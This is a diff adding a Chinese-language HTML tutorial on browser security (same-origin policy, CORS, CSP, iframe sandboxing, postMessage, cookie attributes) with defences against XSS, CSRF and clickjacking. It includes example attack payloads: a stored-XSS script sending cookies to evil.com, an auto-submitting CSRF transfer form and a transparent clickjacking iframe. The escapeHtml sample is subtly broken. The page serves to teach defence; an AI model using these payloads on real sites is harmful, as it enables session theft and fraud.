@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>同源策略与安全</title>
+    <style>
+        :root { --primary: #1a73e8; --primary-light: #e8f0fe; --secondary: #34a853; --warning: #ea4335; --purple: #9c27b0; --bg: #f8f9fa; --card-bg: #ffffff; --text: #202124; --border: #dadce0; --code-bg: #f1f3f4; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Noto Sans SC', sans-serif; background: var(--bg); color: var(--text); line-height: 1.8; padding: 20px; }
+        .container { max-width: 960px; margin: 0 auto; }
+        h1 { font-size: 2em; color: var(--primary); border-bottom: 3px solid var(--primary); padding-bottom: 12px; margin-bottom: 24px; }
+        h2 { font-size: 1.5em; color: var(--primary); margin: 32px 0 16px; padding-left: 12px; border-left: 4px solid var(--primary); }
+        h3 { font-size: 1.2em; margin: 20px 0 10px; }
+        .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; padding: 24px; margin: 16px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+        .highlight { background: var(--primary-light); border-left: 4px solid var(--primary); padding: 16px; border-radius: 0 8px 8px 0; margin: 12px 0; }
+        .warning { background: #fce8e6; border-left: 4px solid var(--warning); padding: 16px; border-radius: 0 8px 8px 0; margin: 12px 0; }
+        .success { background: #e6f4ea; border-left: 4px solid var(--secondary); padding: 16px; border-radius: 0 8px 8px 0; margin: 12px 0; }
+        .purple { background: #f3e5f5; border-left: 4px solid var(--purple); padding: 16px; border-radius: 0 8px 8px 0; margin: 12px 0; }
+        pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; padding: 16px; overflow-x: auto; font-family: 'Fira Code','Consolas',monospace; font-size: 0.9em; line-height: 1.6; margin: 12px 0; }
+        code { background: var(--code-bg); padding: 2px 6px; border-radius: 4px; font-size: 0.9em; }
+        pre code { background: none; padding: 0; }
+        ul, ol { padding-left: 24px; margin: 8px 0; }
+        li { margin: 6px 0; }
+        table { width: 100%; border-collapse: collapse; margin: 16px 0; }
+        th, td { border: 1px solid var(--border); padding: 12px; text-align: left; }
+        th { background: var(--primary-light); font-weight: 600; }
+        .flow-diagram { background: var(--card-bg); border: 2px solid var(--primary); border-radius: 12px; padding: 20px; text-align: center; font-family: monospace; margin: 16px 0; white-space: pre; line-height: 1.6; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>同源策略与安全</h1>
+
+    <div class="highlight">
+        <strong>核心概念：</strong>同源策略（Same-Origin Policy, SOP）是浏览器最基本的安全策略，它限制不同源之间的资源交互，防止恶意网站窃取用户数据。CORS（跨源资源共享）是SOP的补充机制，允许服务器声明哪些外部源可以访问其资源。CSP（内容安全策略）则进一步限制页面可以加载和执行的资源来源。
+    </div>
+
+    <!-- ==================== 一、同源策略 ==================== -->
+    <h2>一、同源策略（Same-Origin Policy）</h2>
+
+    <div class="card">
+        <h3>1.1 什么是同源</h3>
+        <p>两个URL的<strong>协议（protocol）、域名（host）、端口（port）</strong>都相同才被认为是同源：</p>
+        <table>
+            <tr><th>URL</th><th>与 http://example.com/path 比较</th><th>原因</th></tr>
+            <tr><td><code>https://example.com/path</code></td><td>不同源</td><td>协议不同（http vs https）</td></tr>
+            <tr><td><code>http://www.example.com/path</code></td><td>不同源</td><td>域名不同（example.com vs www.example.com）</td></tr>
+            <tr><td><code>http://example.com:8080/path</code></td><td>不同源</td><td>端口不同（80 vs 8080）</td></tr>
+            <tr><td><code>http://example.com/other</code></td><td>同源</td><td>路径不影响同源判定</td></tr>
+            <tr><td><code>http://example.com/path?q=1</code></td><td>同源</td><td>查询参数不影响同源判定</td></tr>
+        </table>
+    </div>
+
+    <div class="card">
+        <h3>1.2 SOP的限制范围</h3>
+        <table>
+            <tr><th>资源</th><th>是否受SOP限制</th><th>说明</th></tr>
+            <tr><td>AJAX / Fetch请求</td><td>受限</td><td>默认不能跨域发送请求</td></tr>
+            <tr><td>DOM操作</td><td>受限</td><td>iframe中不同源的DOM不可访问</td></tr>
+            <tr><td>Cookie / LocalStorage / IndexedDB</td><td>受限</td><td>只能访问同源的存储</td></tr>
+            <tr><td>CSS / JS / 图片 / 视频</td><td>不受限</td><td>可以跨域加载（但有CSP限制）</td></tr>
+            <tr><td>表单提交</td><td>不受限</td><td>可以跨域提交（但无法读取响应）</td></tr>
+            <tr><td>WebSocket</td><td>不受限</td><td>连接不受SOP限制</td></tr>
+        </table>
+    </div>
+
+    <!-- ==================== 二、CORS ==================== -->
+    <h2>二、CORS（跨源资源共享）</h2>
+
+    <div class="card">
+        <h3>2.1 CORS基本概念</h3>
+        <p>CORS是W3C标准，允许服务器声明哪些外部源可以访问其资源。浏览器在发起跨域请求时，根据服务器返回的CORS头决定是否允许访问响应数据。</p>
+    </div>
+
+    <div class="card">
+        <h3>2.2 简单请求（Simple Request）</h3>
+        <p>满足以下所有条件的请求是简单请求，浏览器直接发送：</p>
+        <ul>
+            <li><strong>方法：</strong>GET、HEAD、POST</li>
+            <li><strong>头部：</strong>只包含安全的头部（Accept、Accept-Language、Content-Language、Content-Type）</li>
+            <li><strong>Content-Type：</strong>仅限 <code>text/plain</code>、<code>multipart/form-data</code>、<code>application/x-www-form-urlencoded</code></li>
+            <li>没有使用 ReadableStream 等</li>
+        </ul>
+        <pre><code>// 简单请求（浏览器直接发送，不预检）
+fetch('https://api.example.com/data', {
+    method: 'GET',
+    headers: {
+        'Accept': 'application/json'
+    }
+});
+
+// 服务器响应头：
+// Access-Control-Allow-Origin: https://myapp.com
+// Access-Control-Allow-Credentials: true</code></pre>
+    </div>
+
+    <div class="card">
+        <h3>2.3 预检请求（Preflight Request）</h3>
+        <p>不满足简单请求条件的请求（如PUT、DELETE方法，或自定义头部），浏览器会先发送一个 <code>OPTIONS</code> 预检请求：</p>
+        <div class="flow-diagram">
+浏览器                                    服务器
+  │                                         │
+  │  ──── OPTIONS /api/data ──────→         │  预检请求
+  │       Origin: https://myapp.com         │
+  │       Access-Control-Request-Method: PUT│
+  │       Access-Control-Request-Headers:   │
+  │           Authorization, X-Custom       │
+  │                                         │
+  │  ←── 204 No Content ────────────        │  预检响应
+  │       Access-Control-Allow-Origin: *    │
+  │       Access-Control-Allow-Methods: PUT │
+  │       Access-Control-Allow-Headers:     │
+  │           Authorization, X-Custom       │
+  │       Access-Control-Max-Age: 86400     │
+  │                                         │
+  │  ──── PUT /api/data ──────────→         │  实际请求
+  │       Authorization: Bearer xxx         │
+  │       X-Custom: value                   │
+  │                                         │
+  │  ←── 200 OK ────────────────────        │  实际响应</div>
+    </div>
+
+    <div class="card">
+        <h3>2.4 CORS响应头详解</h3>
+        <table>
+            <tr><th>响应头</th><th>说明</th><th>示例</th></tr>
+            <tr><td><code>Access-Control-Allow-Origin</code></td><td>允许访问的源</td><td><code>https://myapp.com</code> 或 <code>*</code></td></tr>
+            <tr><td><code>Access-Control-Allow-Methods</code></td><td>允许的HTTP方法</td><td><code>GET, POST, PUT, DELETE</code></td></tr>
+            <tr><td><code>Access-Control-Allow-Headers</code></td><td>允许的请求头</td><td><code>Authorization, Content-Type</code></td></tr>
+            <tr><td><code>Access-Control-Allow-Credentials</code></td><td>是否允许携带Cookie</td><td><code>true</code></td></tr>
+            <tr><td><code>Access-Control-Expose-Headers</code></td><td>允许前端读取的响应头</td><td><code>X-Total-Count, X-Request-Id</code></td></tr>
+            <tr><td><code>Access-Control-Max-Age</code></td><td>预检结果缓存时间（秒）</td><td><code>86400</code></td></tr>
+        </table>
+    </div>
+
+    <div class="card">
+        <h3>2.5 携带Cookie的跨域请求</h3>
+        <pre><code>// 前端：需要设置 credentials: 'include'
+fetch('https://api.example.com/user', {
+    credentials: 'include'  // 携带Cookie
+});
+
+// 或使用 axios
+axios.defaults.withCredentials = true;
+
+// 服务器必须设置：
+// Access-Control-Allow-Origin: https://myapp.com（不能用*）
+// Access-Control-Allow-Credentials: true
+
+// ⚠️ 当 Allow-Credentials 为 true 时，
+// Allow-Origin 不能设为 *，必须指定具体域名</code></pre>
+        <div class="warning">
+            <strong>安全注意：</strong><code>Access-Control-Allow-Origin: *</code> 和 <code>Access-Control-Allow-Credentials: true</code> 不能同时使用。这是CORS规范的安全限制，防止任意网站携带Cookie访问API。
+        </div>
+    </div>
+
+    <!-- ==================== 三、CSP ==================== -->
+    <h2>三、CSP（内容安全策略）</h2>
+
+    <div class="card">
+        <h3>3.1 什么是CSP</h3>
+        <p>Content Security Policy 是一种安全机制，通过HTTP响应头或 <code>&lt;meta&gt;</code> 标签告诉浏览器哪些资源可以加载和执行，有效防御XSS攻击。</p>
+        <pre><code>// HTTP响应头方式
+Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
+
+// &lt;meta&gt; 标签方式
+&lt;meta http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self' cdn.example.com"&gt;</code></pre>
+    </div>
+
+    <div class="card">
+        <h3>3.2 CSP指令详解</h3>
+        <table>
+            <tr><th>指令</th><th>控制对象</th><th>说明</th></tr>
+            <tr><td><code>default-src</code></td><td>所有资源的默认策略</td><td>其他指令未设置时的回退值</td></tr>
+            <tr><td><code>script-src</code></td><td>JavaScript</td><td>控制脚本来源</td></tr>
+            <tr><td><code>style-src</code></td><td>CSS样式表</td><td>控制样式来源</td></tr>
+            <tr><td><code>img-src</code></td><td>图片</td><td>控制图片来源</td></tr>
+            <tr><td><code>font-src</code></td><td>字体</td><td>控制字体来源</td></tr>
+            <tr><td><code>connect-src</code></td><td>AJAX/WebSocket/SSE</td><td>控制网络请求目标</td></tr>
+            <tr><td><code>media-src</code></td><td>音频/视频</td><td>控制媒体来源</td></tr>
+            <tr><td><code>frame-src</code></td><td>iframe</td><td>控制iframe来源</td></tr>
+            <tr><td><code>frame-ancestors</code></td><td>被iframe嵌入</td><td>控制哪些页面可以嵌入此页面</td></tr>
+            <tr><td><code>report-uri</code></td><td>违规报告</td><td>CSP违规时上报URL</td></tr>
+        </table>
+    </div>
+
+    <div class="card">
+        <h3>3.3 CSP源值（Source Values）</h3>
+        <table>
+            <tr><th>值</th><th>含义</th><th>示例</th></tr>
+            <tr><td><code>'self'</code></td><td>同源</td><td><code>script-src 'self'</code></td></tr>
+            <tr><td><code>'none'</code></td><td>不允许任何来源</td><td><code>default-src 'none'</code></td></tr>
+            <tr><td><code>'unsafe-inline'</code></td><td>允许内联脚本/样式</td><td><code>script-src 'unsafe-inline'</code></td></tr>
+            <tr><td><code>'unsafe-eval'</code></td><td>允许eval()</td><td><code>script-src 'unsafe-eval'</code></td></tr>
+            <tr><td><code>'nonce-&lt;base64&gt;'</code></td><td>随机数白名单</td><td><code>script-src 'nonce-abc123'</code></td></tr>
+            <tr><td><code>'sha256-...'</code></td><td>脚本哈希白名单</td><td><code>script-src 'sha256-xxx'</code></td></tr>
+            <tr><td>域名</td><td>允许指定域名</td><td><code>script-src cdn.example.com</code></td></tr>
+        </table>
+        <pre><code>// 完整CSP配置示例
+Content-Security-Policy:
+    default-src 'self';
+    script-src 'self' 'nonce-random123' https://cdn.example.com;
+    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+    img-src 'self' data: https://*.example.com;
+    font-src 'self' https://fonts.gstatic.com;
+    connect-src 'self' https://api.example.com wss://ws.example.com;
+    frame-src 'self' https://embed.example.com;
+    frame-ancestors 'self';
+    base-uri 'self';
+    form-action 'self';
+    report-uri /csp-report;
+
+// nonce方式使用：
+&lt;script nonce="random123"&gt;
+    // 这段脚本被CSP允许执行
+    console.log('CSP nonce');
+&lt;/script&gt;</code></pre>
+    </div>
+
+    <div class="card">
+        <h3>3.4 CSP报告模式</h3>
+        <pre><code>// 报告模式：不阻止资源加载，只报告违规
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+
+// 服务器接收报告的端点示例（Express）
+app.post('/csp-report', (req, res) => {
+    const report = req.body['csp-report'];
+    console.log('CSP违规:', {
+        blockedUri: report['blocked-uri'],
+        violatedDirective: report['violated-directive'],
+        documentUri: report['document-uri'],
+        sourceFile: report['source-file'],
+        lineNumber: report['line-number']
+    });
+    res.status(204).end();
+});</code></pre>
+        <div class="success">
+            <strong>CSP部署建议：</strong>先用 <code>Content-Security-Policy-Report-Only</code> 上线，收集一段时间的违规报告，确认策略不会误伤正常功能后，再切换为 <code>Content-Security-Policy</code> 正式生效。
+        </div>
+    </div>
+
+    <!-- ==================== 四、iframe安全 ==================== -->
+    <h2>四、iframe安全</h2>
+
+    <div class="card">
+        <h3>4.1 iframe沙箱（sandbox）</h3>
+        <pre><code>&lt;!-- 完全沙箱化：禁止所有权限 --&gt;
+&lt;iframe src="https://external.com" sandbox&gt;&lt;/iframe&gt;
+
+&lt;!-- 选择性启用权限 --&gt;
+&lt;iframe src="https://external.com" sandbox="
+    allow-scripts        // 允许执行脚本
+    allow-same-origin    // 允许访问同源资源
+    allow-forms          // 允许提交表单
+    allow-popups         // 允许弹出窗口
+    allow-modals         // 允许打开模态框
+    allow-top-navigation // 允许导航顶层页面
+"&gt;&lt;/iframe&gt;</code></pre>
+        <table>
+            <tr><th>沙箱权限</th><th>说明</th></tr>
+            <tr><td><code>allow-scripts</code></td><td>允许执行JavaScript</td></tr>
+            <tr><td><code>allow-same-origin</code></td><td>允许将内容视为同源（可访问Cookie等）</td></tr>
+            <tr><td><code>allow-forms</code></td><td>允许提交表单</td></tr>
+            <tr><td><code>allow-popups</code></td><td>允许打开新窗口</td></tr>
+            <tr><td><code>allow-top-navigation</code></td><td>允许导航顶层页面</td></tr>
+        </table>
+        <div class="warning">
+            <strong>注意：</strong><code>allow-scripts</code> 和 <code>allow-same-origin</code> 同时使用时，iframe中的脚本可以移除sandbox属性，等于没有沙箱保护。不要同时使用这两个选项。
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>4.2 防止iframe嵌入</h3>
+        <pre><code>// 方法1：X-Frame-Options（旧方案，向后兼容）
+X-Frame-Options: DENY           // 禁止任何网站嵌入
+X-Frame-Options: SAMEORIGIN     // 只允许同源嵌入
+X-Frame-Options: ALLOW-FROM https://trusted.com  // 允许指定网站
+
+// 方法2：CSP frame-ancestors（新方案，推荐）
+Content-Security-Policy: frame-ancestors 'none';     // 禁止嵌入
+Content-Security-Policy: frame-ancestors 'self';     // 只允许同源
+Content-Security-Policy: frame-ancestors https://trusted.com;</code></pre>
+    </div>
+
+    <!-- ==================== 五、postMessage ==================== -->
+    <h2>五、postMessage安全通信</h2>
+
+    <div class="card">
+        <h3>5.1 基本用法</h3>
+        <pre><code>// 父页面（https://parent.com）
+const iframe = document.getElementById('myFrame');
+
+// 发送消息
+iframe.contentWindow.postMessage(
+    { type: 'GREETING', data: 'Hello from parent' },
+    'https://child.com'  // 目标源（必须指定）
+);
+
+// 接收消息
+window.addEventListener('message', (event) => {
+    // ⚠️ 安全校验：必须验证来源
+    if (event.origin !== 'https://child.com') return;
+
+    console.log('收到消息:', event.data);
+    console.log('发送者:', event.origin);
+});
+
+// iframe页面（https://child.com）
+window.addEventListener('message', (event) => {
+    // 验证来源
+    if (event.origin !== 'https://parent.com') return;
+
+    // 回复消息
+    event.source.postMessage(
+        { type: 'REPLY', data: 'Hello from child' },
+        event.origin
+    );
+});</code></pre>
+    </div>
+
+    <div class="card">
+        <h3>5.2 postMessage安全最佳实践</h3>
+        <ul>
+            <li><strong>始终指定targetOrigin：</strong>不要使用 <code>'*'</code>，应指定具体的接收方源</li>
+            <strong>始终验证event.origin：</strong>在接收消息时检查来源是否可信</li>
+            <li><strong>验证消息内容：</strong>不要盲目信任接收到的数据，进行类型和格式校验</li>
+            <li><strong>不要传递敏感数据：</strong>postMessage的消息可能被恶意中间件截获</li>
+            <li><strong>使用结构化克隆：</strong>postMessage使用结构化克隆算法，支持复杂对象</li>
+        </ul>
+        <pre><code>// ❌ 不安全
+iframe.contentWindow.postMessage(data, '*');  // 任何页面都可能收到
+
+// ✅ 安全
+iframe.contentWindow.postMessage(data, 'https://trusted.com');
+
+// ❌ 不安全的接收
+window.addEventListener('message', (event) => {
+    process(event.data);  // 不验证来源，直接处理
+});
+
+// ✅ 安全的接收
+window.addEventListener('message', (event) => {
+    const allowedOrigins = ['https://parent.com', 'https://partner.com'];
+    if (!allowedOrigins.includes(event.origin)) return;
+
+    // 验证消息结构
+    if (typeof event.data !== 'object' || !event.data.type) return;
+
+    process(event.data);
+});</code></pre>
+    </div>
+
+    <!-- ==================== 六、Cookie安全 ==================== -->
+    <h2>六、Cookie安全</h2>
+
+    <div class="card">
+        <h3>6.1 Cookie安全属性</h3>
+        <pre><code>// 完整的安全Cookie配置
+Set-Cookie: sessionId=abc123;
+    Domain=.example.com;       // 作用域名
+    Path=/;                    // 作用路径
+    Max-Age=3600;              // 过期时间（秒）
+    Secure;                    // 只在HTTPS下发送
+    HttpOnly;                  // 禁止JavaScript访问
+    SameSite=Strict;           // 跨站请求不发送Cookie
+    Partitioned;               // CHIPS：分区Cookie（第三方场景）</code></pre>
+        <table>
+            <tr><th>属性</th><th>说明</th><th>防护作用</th></tr>
+            <tr><td><code>Secure</code></td><td>只在HTTPS连接下发送Cookie</td><td>防止中间人攻击截获Cookie</td></tr>
+            <tr><td><code>HttpOnly</code></td><td>JavaScript无法通过 <code>document.cookie</code> 访问</td><td>防止XSS窃取Cookie</td></tr>
+            <tr><td><code>SameSite</code></td><td>控制跨站请求是否携带Cookie</td><td>防止CSRF攻击</td></tr>
+            <tr><td><code>Partitioned</code></td><td>第三方Cookie按顶级站点分区</td><td>防止跨站追踪（CHIPS）</td></tr>
+        </table>
+    </div>
+
+    <div class="card">
+        <h3>6.2 SameSite详解</h3>
+        <table>
+            <tr><th>值</th><th>行为</th><th>适用场景</th></tr>
+            <tr><td><code>Strict</code></td><td>跨站请求完全不携带Cookie</td><td>最高安全级，如银行操作</td></tr>
+            <tr><td><code>Lax</code></td><td>顶级导航的GET请求携带Cookie</td><td>大多数场景的默认值</td></tr>
+            <tr><td><code>None</code></td><td>所有请求都携带Cookie（需配合Secure）</td><td>嵌入式场景（如第三方支付）</td></tr>
+        </table>
+        <div class="warning">
+            <strong>注意：</strong>Chrome从2024年开始逐步淘汰第三方Cookie。对于需要在跨站上下文中使用的Cookie，应使用 <code>SameSite=None; Secure; Partitioned</code> （CHIPS方案）。
+        </div>
+    </div>
+
+    <!-- ==================== 七、常见Web攻击与防御 ==================== -->
+    <h2>七、常见Web攻击与防御</h2>
+
+    <div class="card">
+        <h3>7.1 XSS（跨站脚本攻击）</h3>
+        <p><strong>攻击方式：</strong>在网页中注入恶意脚本，在用户浏览器中执行</p>
+        <pre><code>// 存储型XSS示例：
+// 攻击者在评论中输入：
+&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
+
+// 防御措施：
+// 1. 输出编码（HTML转义）
+function escapeHtml(str) {
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/&lt;/g, '&amp;lt;')
+        .replace(/&gt;/g, '&amp;gt;')
+        .replace(/"/g, '&amp;quot;')
+        .replace(/'/g, '&#x27;');
+}
+
+// 2. CSP禁止内联脚本
+Content-Security-Policy: script-src 'self'; // 没有'unsafe-inline'
+
+// 3. Cookie设置HttpOnly
+Set-Cookie: sid=abc; HttpOnly; // JS无法读取
+
+// 4. 使用textContent代替innerHTML
+element.textContent = userInput;  // 安全
+element.innerHTML = userInput;    // 危险</code></pre>
+    </div>
+
+    <div class="card">
+        <h3>7.2 CSRF（跨站请求伪造）</h3>
+        <p><strong>攻击方式：</strong>诱导用户在已登录的状态下访问恶意页面，利用用户的Cookie发起非预期请求</p>
+        <pre><code>// 攻击页面（evil.com）：
+&lt;!-- 隐藏的表单自动提交 --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="csrf"&gt;
+    &lt;input type="hidden" name="to" value="attacker"&gt;
+    &lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+
+// 防御措施：
+// 1. SameSite Cookie
+Set-Cookie: sid=abc; SameSite=Strict;
+
+// 2. CSRF Token
+// 服务器生成token，嵌入表单，提交时验证
+&lt;input type="hidden" name="_csrf" value="random-token"&gt;
+
+// 3. 验证Referer/Origin头
+if (req.headers.origin !== 'https://myapp.com') {
+    return res.status(403).send('Forbidden');
+}
+
+// 4. 自定义请求头（XHR/Fetch自动添加的头会触发CORS预检）
+fetch('/api/transfer', {
+    headers: { 'X-Requested-With': 'XMLHttpRequest' }
+});</code></pre>
+    </div>
+
+    <div class="card">
+        <h3>7.3 点击劫持（Clickjacking）</h3>
+        <pre><code>// 攻击方式：用透明iframe覆盖在诱饵按钮上
+&lt;!-- evil.com --&gt;
+&lt;iframe src="https://bank.com/delete-account"
+    style="opacity:0; position:absolute; top:0; left:0;"&gt;
+&lt;/iframe&gt;
+&lt;button&gt;领取奖品&lt;/button&gt;  // 实际点击的是iframe中的删除账户按钮
+
+// 防御措施：
+// 1. X-Frame-Options
+X-Frame-Options: DENY
+
+// 2. CSP frame-ancestors
+Content-Security-Policy: frame-ancestors 'none';
+
+// 3. JavaScript防御（不适合所有场景）
+if (top !== self) {
+    top.location = self.location;
+}</code></pre>
+    </div>
+
+    <!-- ==================== 八、安全头部总结 ==================== -->
+    <h2>八、安全响应头总结</h2>
+
+    <div class="card">
+        <h3>8.1 推荐的安全头部</h3>
+        <pre><code>// 完整的安全响应头配置
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 0  // 已废弃，现代浏览器用CSP替代
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=()
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Embedder-Policy: require-corp
+Cross-Origin-Resource-Policy: same-origin</code></pre>
+        <table>
+            <tr><th>响应头</th><th>作用</th></tr>
+            <tr><td><code>Strict-Transport-Security</code> (HSTS)</td><td>强制HTTPS，防止降级攻击</td></tr>
+            <tr><td><code>Content-Security-Policy</code></td><td>限制资源加载来源，防XSS</td></tr>
+            <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>禁止MIME类型嗅探</td></tr>
+            <tr><td><code>Referrer-Policy</code></td><td>控制Referer头信息泄露</td></tr>
+            <tr><td><code>Permissions-Policy</code></td><td>控制浏览器功能（摄像头、麦克风等）</td></tr>
+            <tr><td><code>Cross-Origin-Opener-Policy</code></td><td>隔离浏览上下文</td></tr>
+            <tr><td><code>Cross-Origin-Embedder-Policy</code></td><td>控制跨源资源嵌入</td></tr>
+            <tr><td><code>Cross-Origin-Resource-Policy</code></td><td>控制跨源资源加载</td></tr>
+        </table>
+    </div>
+
+    <div class="highlight">
+        <strong>总结：</strong>浏览器安全体系以同源策略（SOP）为核心，通过CORS解决合法的跨域通信需求，通过CSP防御XSS攻击，通过iframe沙箱和postMessage实现安全的跨域交互，通过Cookie安全属性防御CSRF和会话劫持。实际项目中应组合使用这些机制，形成纵深防御。
+    </div>
+</div>
+<!-- 本文档总结了浏览器同源策略、CORS、CSP及Web安全防御体系 -->
+</body>
+</html>
